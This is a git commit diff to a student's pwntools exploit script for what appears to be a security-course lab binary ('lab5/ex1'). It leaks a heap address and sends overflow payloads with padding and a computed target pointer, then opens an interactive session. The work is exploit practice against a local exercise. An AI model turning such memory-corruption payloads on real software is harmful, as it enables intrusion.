f9fcf9d20c0ae0adc00bba6d859cae7354eda9f7
TgeorgeT <george_teodorescu2002@yahoo.com>
2024-12-05 20:57:35 +0200

    Add solution

--- lab5/solve_ex1.py
+++ lab5/solve_ex1.py
@@ -2,18 +2,20 @@ from pwn import *
 
 context.arch = "amd64"
 
+
 def extract_address(s):
     leaked_bytes = s
-    return struct.unpack("<Q", leaked_bytes.ljust(8, b"\x00"))[0]
+    print(s)
+    return struct.unpack("<Q", leaked_bytes[:-1].ljust(8, b"\x00"))[0]
 
 
-target = process("./bin/ex1")
+# target = process("./bin/ex1")
 
-context.terminal=["tmux", "split-window", "-h"]
+context.terminal = ["gnome-terminal", "--geometry=160x80", "-e"]
 io = gdb.debug(
     "./bin/ex1",
     """
-    break ex1.c:57
+    break ex1.c:63
     c
     """,
 )
@@ -26,16 +28,18 @@ print("--", io.recvline())
 
 print("--", io.recv())
 
-payload = b"PRINT\0" + 18*b"A" + b"\xd0"
+payload = b"PRINT\0" + 18 * b"A" + b"\xd0"
 io.send(payload)
 print("sent next")
 
 db_head_leak_line = io.recv()
 db_head = extract_address(db_head_leak_line)
+leet_address = db_head + 1120 + 4
+
 print(hex(db_head))
-print(hex(db_head+11224))
+print(hex(db_head + 1120 + 4))
 
-
-io.sendline(b"PRINT\0")
+payload = b"\0" + 47 * b"A" + p64(leet_address)
+io.send(payload)
 print("sent next")
 io.interactive()
